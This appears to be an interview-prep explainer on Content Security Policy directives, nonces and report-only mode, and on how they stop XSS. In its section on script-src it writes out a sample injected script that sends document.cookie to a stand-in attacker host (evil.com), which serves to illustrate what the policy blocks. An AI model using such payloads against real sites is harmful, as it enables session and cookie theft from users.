# Content Security Policy (CSP): Directives and How They Stop XSS

CSP is a browser-enforced allowlist, delivered via an HTTP response header (`Content-Security-Policy`) or a `<meta>` tag, that restricts **what sources of content a page is allowed to load and execute** — scripts, styles, images, fonts, frames, connections, and more. It doesn't fix an XSS vulnerability (the injection point still exists), but it acts as a **second line of defense**: even if an attacker manages to inject `<script>...</script>` into the page, CSP can prevent the browser from actually executing it.

## The core mechanism: allowlisting execution sources

A CSP policy is a set of directives, each naming allowed sources for one category of resource:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; object-src 'none'; frame-ancestors 'none';
```

| Directive | Controls | Example value | Meaning |
|---|---|---|---|
| `default-src` | Fallback for any directive not explicitly set | `'self'` | Only load resources from the page's own origin unless overridden |
| `script-src` | Where JS can be loaded/executed from | `'self' https://cdn.example.com` | Scripts must come from the same origin or that CDN — an injected `<script src="https://evil.com/x.js">` is blocked because `evil.com` isn't in the allowlist |
| `style-src` | Where CSS can load from | `'self'` | Blocks injected `<style>`/`<link rel=stylesheet>` from other origins |
| `img-src` | Where images can load from | `*` | Wide open here; often tightened in practice |
| `connect-src` | Where `fetch`/XHR/WebSocket can connect to | `'self' https://api.example.com` | Blocks a script (even a legitimately-loaded one) from exfiltrating data to an unlisted origin via `fetch` |
| `frame-ancestors` | Which origins may embed this page in an `<iframe>` | `'none'` or `'self'` | The modern, CSP-based replacement for `X-Frame-Options` (see the clickjacking theory file) |
| `object-src` | Where `<object>`/`<embed>`/`<applet>` can load from | `'none'` | Commonly fully disabled — legacy plugin content is a frequent XSS/exploit vector |
| `base-uri` | What values `<base href>` can be set to | `'self'` | Prevents an injected `<base>` tag from silently rewriting all relative URLs on the page to point at an attacker's domain |

## Why `script-src` is the directive that actually stops XSS execution

This is the mechanism interviewers check for precisely: suppose an attacker successfully injects `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` into the page via a stored-XSS hole. With `script-src 'self'` (and no `'unsafe-inline'`), the browser refuses to **execute** that injected inline script at all — CSP evaluates every script the page attempts to run against the policy at execution time, not just at initial page load, and inline scripts (without a nonce/hash, see below) are blocked outright by any `script-src` policy that omits `'unsafe-inline'`. The XSS injection still technically "succeeded" (the tag is in the DOM), but its payload never runs, and even a `<script src="...">` pointing at an external attacker-controlled URL is blocked unless that exact origin is allowlisted.

## `'unsafe-inline'` and `'unsafe-eval'` — the footguns

- **`'unsafe-inline'`** re-permits inline `<script>` blocks and inline event handlers (`onclick="..."`) — which defeats the entire XSS-mitigation value of `script-src`, since most XSS payloads are exactly this kind of inline script. Many legacy apps add it because they have inline scripts sprinkled through their HTML, but doing so re-opens the door CSP was meant to close.
- **`'unsafe-eval'`** permits `eval()`, `new Function()`, and similar string-to-code execution — another common XSS sink; omitting it blocks a class of DOM-based XSS that relies on `eval`.

## Nonces and hashes: allowing specific inline scripts without `'unsafe-inline'`

For apps that legitimately need a few inline `<script>` blocks (e.g. server-rendered bootstrap data), CSP supports per-request **nonces** (a random value regenerated on every response, added to both the header and the script tag) or **hashes** (a SHA-256 hash of the exact script content):

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0mVal123';
```
```html
<script nonce="r4nd0mVal123">/* legitimate inline bootstrap code */</script>
```
An attacker's injected `<script>` tag has no way to know the current request's nonce (it's regenerated every response and never predictable), so even though inline scripts are allowed *with the right nonce*, an injected script without it is still blocked. This is the standard way to keep `'unsafe-inline'` off while still supporting necessary inline scripts.

## Report-only mode for safe rollout

`Content-Security-Policy-Report-Only` applies the same directive syntax but only **reports** violations (via `report-uri`/`report-to`) instead of blocking them — the standard way to test a new/tightened policy against real traffic before enforcing it, since an overly strict policy shipped directly to enforcement mode can break legitimate functionality (a common real-world rollout mistake).

## What CSP does NOT do

- It does not sanitize or fix the underlying injection vulnerability — it's a **mitigating control**, not a substitute for proper output encoding.
- It does not stop XSS payloads that only manipulate the DOM without loading/executing new script/resources from disallowed sources (e.g. a payload that purely rearranges existing, already-loaded page elements) — though this is a narrow and less common attack surface compared to script injection.
- A misconfigured policy (e.g. accidentally including `'unsafe-inline'`) provides a false sense of security while doing almost nothing against typical XSS payloads.

## Interview framing

*"CSP is a browser-enforced allowlist for what a page can load and execute, delivered as a header. The directive that actually stops XSS payloads from running is `script-src` — if it's set to `'self'` (or specific trusted origins) without `'unsafe-inline'`/`'unsafe-eval'`, an injected inline `<script>` tag is present in the DOM but the browser refuses to execute it, and a script tag pointing at an attacker's domain is blocked unless that origin is explicitly allowlisted. For apps that need legitimate inline scripts, nonces or hashes let you allow specific known-good inline scripts without reopening the door to arbitrary injected ones."*
